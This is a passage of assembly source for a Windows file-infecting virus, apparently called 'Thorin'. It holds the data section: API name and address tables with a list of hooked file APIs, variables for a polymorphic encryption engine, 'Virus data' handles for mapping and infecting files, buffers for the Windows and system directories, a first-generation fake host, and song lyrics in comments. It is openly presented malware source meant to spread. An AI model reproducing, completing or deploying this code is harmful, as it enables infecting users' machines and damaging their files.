@SetCurrentDirectoryA   db      "SetCurrentDirectoryA",0
@GetWindowsDirectoryA   db      "GetWindowsDirectoryA",0
@GetSystemDirectoryA    db      "GetSystemDirectoryA",0
@CreateFileMappingA     db      "CreateFileMappingA",0
@MapViewOfFile          db      "MapViewOfFile",0
@UnmapViewOfFile        db      "UnmapViewOfFile",0
@SetEndOfFile           db      "SetEndOfFile",0
@WriteFile              db      "WriteFile",0
@GetTickCount           db      "GetTickCount",0
@GetVersion             db      "GetVersion",0
@GlobalAlloc            db      "GlobalAlloc",0
@GlobalFree             db      "GlobalFree",0
@GetFileSize            db      "GetFileSize",0
@SetVolumeLabelA        db      "SetVolumeLabelA",0
@GetSystemTime          db      "GetSystemTime",0

@@HookedNamez           label   byte
@MoveFileA              db      "MoveFileA",0
@CopyFileA              db      "CopyFileA",0
@GetFullPathNameA       db      "GetFullPathNameA",0
@DeleteFileA            db      "DeleteFileA",0
@WinExec                db      "WinExec",0
@CreateProcessA         db      "CreateProcessA",0
@CreateFileA            db      "CreateFileA",0
@GetFileAttributesA     db      "GetFileAttributesA",0
@FindFirstFileA         db      "FindFirstFileA",0
@FindNextFileA          db      "FindNextFileA",0
@GetProcAddress         db      "GetProcAddress",0
			db      0BBh            ; I rule! :)

@@USER32_APIs           label   byte
@SwapMouseButton        db      "SwapMouseButton",0
@MessageBoxA            db      "MessageBoxA",0
@FindWindowA            db      "FindWindowA",0
@PostMessageA           db      "PostMessageA",0
			db      ""             ; I like girls...

@@ADVAPI32_APIs         label   byte
@RegCreateKeyExA        db      "RegCreateKeyExA",0
@RegOpenKeyExA          db      "RegOpenKeyExA",0
@RegDeleteKeyA          db      "RegDeleteKeyA",0
			db      ""             ; And music tho :)

@@SHELL32_APIs          label   byte
@ShellExecuteA          db      "ShellExecuteA",0

random_seed     label   byte
rnd_seed1       dd      00000000h
rnd_seed2       dd      00000000h
rnd_seed3       dd      00000000h
		dd      00000000h

; THME Poly Engine data

THME_CounterReg db      00h
THME_PointerReg db      00h
THME_DeltaReg   db      00h

THME_CoproInit  db      00h
THME_CryptOp    db      00h

THME_Recursion  db      00h
THME_LoopAddress db     00000000h
THME_CryptKey   dd      00000000h
THME_Pointer    dd      00000000h
THME_Data2crypt dd      00000000h
THME_Size2crypt dd      00000000h
THME_S2C_div4   dd      00000000h
THME_GDO_TmpCll dd      00000000h
THME_Fix1       dd      00000000h
THME_Key1       dd      00000000h               ; ADD/SUB/XOR key

; Virus data

NewSize         dd      00000000h
SearchHandle    dd      00000000h
FileHandle      dd      00000000h
MapHandle       dd      00000000h
MapAddress      dd      00000000h
AddressTableVA  dd      00000000h
NameTableVA     dd      00000000h
OrdinalTableVA  dd      00000000h
TempGA_IT1      dd      00000000h
TempGA_IT2      dd      00000000h
TempHandle      dd      00000000h
iobytes         dd      00000000h,00000000h,00000000h,00000000h,00000000h
GlobalAllocHnd  dd      00000000h
GlobalAllocHnd_ dd      00000000h
TSHandle        dd      00000000h
RegHandle       dd      00000000h
Disposition     dd      00000000h
lpFilePart      dd      00000000h
WFD_HndInMem    dd      00000000h
WFD_Handles_Count db    00h
CoolFlag        db      00h
inNT            db      00h
CurrentExt      db      00h

tempcurdir      db      7Fh dup (00h)

@@Offsetz               label   byte
_GetModuleHandleA       dd      00000000h
_LoadLibraryA           dd      00000000h
_FindClose              dd      00000000h
_SetFilePointer         dd      00000000h
_SetFileAttributesA     dd      00000000h
_CloseHandle            dd      00000000h
_GetCurrentDirectoryA   dd      00000000h
_SetCurrentDirectoryA   dd      00000000h
_GetWindowsDirectoryA   dd      00000000h
_GetSystemDirectoryA    dd      00000000h
_CreateFileMappingA     dd      00000000h
_MapViewOfFile          dd      00000000h
_UnmapViewOfFile        dd      00000000h
_SetEndOfFile           dd      00000000h
_WriteFile              dd      00000000h
_GetTickCount           dd      00000000h
_GetVersion             dd      00000000h
_GlobalAlloc            dd      00000000h
_GlobalFree             dd      00000000h
_GetFileSize            dd      00000000h
_SetVolumeLabelA        dd      00000000h
_GetSystemTime          dd      00000000h
@@HookedOffsetz         label   byte
_MoveFileA              dd      00000000h
_CopyFileA              dd      00000000h
_GetFullPathNameA       dd      00000000h
_DeleteFileA            dd      00000000h
_WinExec                dd      00000000h
_CreateProcessA         dd      00000000h
_CreateFileA            dd      00000000h
_GetFileAttributesA     dd      00000000h
_FindFirstFileA         dd      00000000h
_FindNextFileA          dd      00000000h
_GetProcAddress         dd      00000000h
n_HookedAPIs            equ     (($-@@HookedOffsetz)/4)


@@USER32_Addresses      label   byte
_SwapMouseButton        dd      00000000h
_MessageBoxA            dd      00000000h
_FindWindowA            dd      00000000h
_PostMessageA           dd      00000000h

@@ADVAPI32_Addresses    label   byte
_RegCreateKeyExA        dd      00000000h
_RegOpenKeyExA          dd      00000000h
_RegDeleteKeyA          dd      00000000h

MAX_PATH                equ     260

FILETIME                STRUC
FT_dwLowDateTime        dd      ?
FT_dwHighDateTime       dd      ?
FILETIME                ENDS

WIN32_FIND_DATA  label  byte
WFD_dwFileAttributes    dd      ?
WFD_ftCreationTime      FILETIME ?
WFD_ftLastAccessTime    FILETIME ?
WFD_ftLastWriteTime     FILETIME ?
WFD_nFileSizeHigh       dd      ?
WFD_nFileSizeLow        dd      ?
WFD_dwReserved0         dd      ?
WFD_dwReserved1         dd      ?
WFD_szFileName          db      MAX_PATH dup (?)
WFD_szAlternateFileName db      13 dup (?)
			db      03 dup (?)

_WIN32_FIND_DATA label  byte
_WFD_dwFileAttributes   dd      ?
_WFD_ftCreationTime     FILETIME ?
_WFD_ftLastAccessTime   FILETIME ?
_WFD_ftLastWriteTime    FILETIME ?
_WFD_nFileSizeHigh      dd      ?
_WFD_nFileSizeLow       dd      ?
_WFD_dwReserved0        dd      ?
_WFD_dwReserved1        dd      ?
_WFD_szFileName         db      MAX_PATH dup (?)
_WFD_szAlternateFileName db     13 dup (?)
			db      03 dup (?)

SYSTEMTIME              label   byte
ST_wYear                dw      ?
ST_wMonth               dw      ?
ST_wDayOfWeek           dw      ?
ST_wDay                 dw      ?
ST_wHour                dw      ?
ST_wMinute              dw      ?
ST_wSecond              dw      ?
ST_wMilliseconds        dw      ?


directories             label   byte

WindowsDir              db      7Fh dup (00h)
SystemDir               db      7Fh dup (00h)
OriginDir               db      7Fh dup (00h)
dirs2inf                equ     (($-directories)/7Fh)
mirrormirror            db      dirs2inf

		align   dword

crypt_end       label   byte

virus_end       label   byte

; ===========================================================================
; First generation host
; ===========================================================================
; I'm alone. I'm with me. I'm thinking. I'm dangerous.

fakehost:
	pop     dword ptr fs:[0]
	pop     eax
	popad
	popfd

	xor     eax,eax
	push    eax
	push    offset szTitle
	push    offset szMessage
	push    eax
	call    MessageBoxA

	push    00000000h
	call    ExitProcess

end             thorin

; ===========================================================================
; Bonus Track                                                               
; ===========================================================================
;
; As this virus is related with Tolkien, there is also a relation with some
; songs of my favourite band: Blind Guardian. And as most of you don't know
; a shit about them, here i will put one song: The Bard's Song [in the fo-
; rest], that is the hymn of all Blind Guardian's fans. By the way, i have to
; wish them good luck, because i've heard that their vocalist had recently an
; operation in his ear. Good luck, Hansi!!! We will always love you!
;
; Bard's Song [in the forest]
; ???????????????????????????
; Now you all know
; The bards and their songs
; When hours have gone by
; I'll close my eyes
; In a world far away
; We may meet again
; But now hear my song
; About the dawn of the night
; Let's sing the bards' song
;
; Tomorrow will take us away
; Far from home
; Noone will ever know our names
; But the bards' song will remain
; Tomorrow will take it away
; The fear of today
; It will be gone
; Due to our magic songs
;
; There's only one song
; Left in my mind
; Tales of a brave man
; Who lived far from here
;
; Now the bard songs are over
; And it's time to leave
; Noone should ask you for the name
; Of the one
; Who tells the story
;
; Tomorrow will take us away
; Far from home
; Noone will ever know our names
; But the bards' song will remain
; Tomorrow all will be known
; And you are not alone
; So don't be afraid
; In the dark and cold
; 'Cause the bards' song will remain
; They all will remain
;
; In my thoughts and dreams
; They're always in my mind
; These songs from hobbits, dwarves and men
; And elves
; Come close your eyes
; You can see them, too
;
; ---
; Copyright (c) 1992 by Blind Guardian; "Somewhere far beyond" album.








